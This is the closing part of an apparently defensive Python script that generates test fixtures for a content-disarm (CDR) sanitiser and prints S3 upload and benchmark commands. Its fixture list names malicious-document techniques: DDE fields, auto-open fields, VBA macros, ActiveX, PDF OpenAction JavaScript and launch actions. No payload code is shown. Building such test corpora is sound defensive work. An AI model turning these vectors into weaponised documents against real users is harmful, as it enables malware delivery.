    ("docx_external_link.docx",      make_docx_external_link),
    ("docx_dde_field.docx",          make_docx_dde_field),
    ("docx_autoopen_field.docx",     make_docx_autoopen_field),
    ("docx_multithreat.docx",        make_docx_multithreat),
    ("xlsm_vba.xlsm",                make_xlsm_vba),
    ("xlsx_dde_formula.xlsx",        make_xlsx_dde_formula),
    ("xlsb_sheet_binary.xlsb",       make_xlsb_sheet_binary),
    ("pptx_activex.pptx",            make_pptx_activex),
    ("pdf_openaction_js.pdf",        make_pdf_openaction_js),
    ("pdf_embedded_file.pdf",        make_pdf_embedded_file),
    ("pdf_acroform_js.pdf",          make_pdf_acroform_js),
    ("pdf_page_launch.pdf",          make_pdf_page_launch),
    ("pdf_multithreat.pdf",          make_pdf_multithreat),
    ("gif_comment_block.gif",        make_gif_comment_block),
    ("tiff_multiframe_exif.tiff",    make_tiff_multiframe_exif),
    ("jpeg_with_exif.jpg",           make_jpeg_with_exif),
]


def main() -> None:
    print(f"Generating {len(FIXTURES)} CDR test fixtures in {OUT_DIR}/\n")
    errors: list[tuple[str, Exception]] = []
    for name, fn in FIXTURES:
        try:
            data = fn()
            _write(name, data)
        except Exception as exc:
            print(f"  ERROR    {name}: {exc}")
            errors.append((name, exc))

    print(f"\n{'=' * 60}")
    print(f"Generated: {len(FIXTURES) - len(errors)}/{len(FIXTURES)}")
    if errors:
        print(f"Failed: {len(errors)}")
        for name, exc in errors:
            print(f"  {name}: {exc}")
        sys.exit(1)

    print("\nUsage:")
    print("  # Upload all fixtures to CDR source bucket")
    print("  aws s3 cp docs/fixtures/ s3://$SOURCE_BUCKET/smoke/ \\")
    print("    --recursive --exclude '*.py' --exclude '*.md'")
    print()
    print("  # Run benchmark against these fixtures")
    print("  python docs/benchmark.py --bucket $SOURCE_BUCKET \\")
    print("    --files docs/fixtures/ --concurrency 4")


if __name__ == "__main__":
    main()
